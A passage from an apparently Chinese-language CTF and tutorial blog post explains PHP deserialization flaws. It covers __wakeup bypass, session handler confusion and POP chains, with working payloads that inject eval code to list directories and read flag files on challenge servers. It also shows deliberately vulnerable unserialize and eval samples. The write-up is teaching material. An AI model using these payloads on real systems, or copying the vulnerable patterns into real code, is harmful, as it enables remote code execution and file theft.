class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="title">return</span> '' </span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span><br><span class="line">  show_source(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span><br><span class="line">  <span class="keyword">echo</span> unserialize($file); </span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码，<code>__destruct</code>方法中<code>show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是<code>__wakeup</code>会在unserialize之前执行，所以要绕过这一点。</p><p>这里就要用到CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:5:”SoFun”:<font color="red">1</font>:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br><strong>绕过__wakeup</strong>：O:5:”SoFun”:<font color="red">2</font>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p><p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p><p>这里可以自己写一个相对简单的例子来加以理解<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twosmil1e</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $key = <span class="string">'twosmi1e'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;key))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key == <span class="string">'twosmi1e'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;key = <span class="string">'you failed 23333'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line">show_source(<span class="string">'serializetest.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"><span class="keyword">echo</span> $answer;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize($answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们首先构造序列化正常序列化对象：<code>O:9:&quot;Twosmil1e&quot;:1:{s:3:&quot;key&quot;;s:8:&quot;twosmi1e&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545226643834.png" alt="Alt text"><br>发现<code>__wakeup()</code>会先执行，<code>__destruct()</code>中的判断不成立，无法输出success，尝试将对象属性个数1改为任意大于1的数，即可绕过<code>__wakeup()</code><br><img src="/2018/12/20/PHP反序列化/1545226823345.png" alt="Alt text"></p><h2 id="0x03-session反序列化漏洞"><a href="#0x03-session反序列化漏洞" class="headerlink" title="0x03 session反序列化漏洞"></a>0x03 session反序列化漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>首先我们需要了解session反序列化是什么？<br>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图<br><img src="/2018/12/20/PHP反序列化/1545235002297.png" alt="Alt text"><br><img src="/2018/12/20/PHP反序列化/1545234989274.png" alt="Alt text"><br><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p><table><thead><tr><th style="text-align:center">存储引擎</th><th style="text-align:center">存储格式</th></tr></thead><tbody><tr><td style="text-align:center">php_binary</td><td style="text-align:center">键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</td></tr><tr><td style="text-align:center">php</td><td style="text-align:center">键名＋竖线＋经过serialize()函数反序列处理的值</td></tr><tr><td style="text-align:center">php_serialize</td><td style="text-align:center">serialize()函数反序列处理数组方式</td></tr></tbody></table><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;name&apos;] = &apos;twosmi1e&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行后在配置文件设定的路径中会生成一个session文件<br><img src="/2018/12/20/PHP反序列化/1545236350464.png" alt="Alt text"><br>存储引擎为php时<br><img src="/2018/12/20/PHP反序列化/1545236700999.png" alt="Alt text"><br>存储引擎为php_binary时结果为<br><img src="/2018/12/20/PHP反序列化/1545236642027.png" alt="Alt text"></p><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>直接上例子吧 </p><h4 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h4><blockquote><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="external">http://web.jarvisoj.com:32784/index.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;sessiontest.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p> 先来看一看phpinfo里的内容 php版本：5.6.21<br> <strong>php大于5.5.4的版本中默认使用php_serialize规则</strong><br> <img src="/2018/12/20/PHP反序列化/1545273945027.png" alt="Alt text"><br>默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。<br><img src="/2018/12/20/PHP反序列化/1545274357328.png" alt="Alt text"></p><blockquote><p>PHP手册<br>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在\$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p></blockquote><p>了解了之后，就可以通过POST方法来构造数据传入<code>$_SESSION</code><br>构造POST提交表单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>构造序列化字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&apos;print_r(dirname(__FILE__));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"> </span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure></p><p>注意需要转义，抓包吧filename改为payload<br>最终提交为：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545276025699.png" alt="Alt text"><br>目录/opt/lampp/htdocs<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code>继续读<br><img src="/2018/12/20/PHP反序列化/1545276188010.png" alt="Alt text"><br>然后用<code>file_get_contents</code>函数读flag<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545276523785.png" alt="Alt text"></p><h4 id="安洵杯Double-S"><a href="#安洵杯Double-S" class="headerlink" title="安洵杯Double-S"></a>安洵杯Double-S</h4><p>也是类似的一道session反序列化的题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">    $m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>emmmm 几乎一样 可以自己试着做一下<br><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p><h2 id="0x04-POP链构造"><a href="#0x04-POP链构造" class="headerlink" title="0x04 POP链构造"></a>0x04 POP链构造</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h3 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;string&apos;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</li><li>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</li><li>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</li><li>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</li><li>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</li></ol><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new Call();//把$mod1赋值为Call类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new funct();//把 $mod1赋值为funct类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new func();//把 $mod1赋值为func类对象</span><br><span class="line">                 </span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new string1();//把 $mod1赋值为string1类对象</span><br><span class="line">                 </span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1= new GetFlag();//把 $str1赋值为GetFlag类对象          </span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = new start_gg;//构造start_gg类对象$b</span><br><span class="line">echo urlencode(serialize($b)).&quot;&lt;br /&gt;&quot;;//显示输出url编码后的序列化对象</span><br></pre></td></tr></table></figure></p><p>输出payload后传参，成功执行get_flag()<br><img src="/2018/12/20/PHP反序列化/1545287095843.png" alt="Alt text"></p><p>另外推荐一下柠檬师傅博客的那道题</p><blockquote><p><a href="http://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="external">https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p></blockquote><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。</p><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p><p>另外再贴一些相关文章</p><blockquote><p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="external">https://xz.aliyun.com/t/3336</a><br><a href="https://xz.aliyun.com/t/2733" target="_blank" rel="external">https://xz.aliyun.com/t/2733</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="external">https://www.anquanke.com/post/id/162300</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
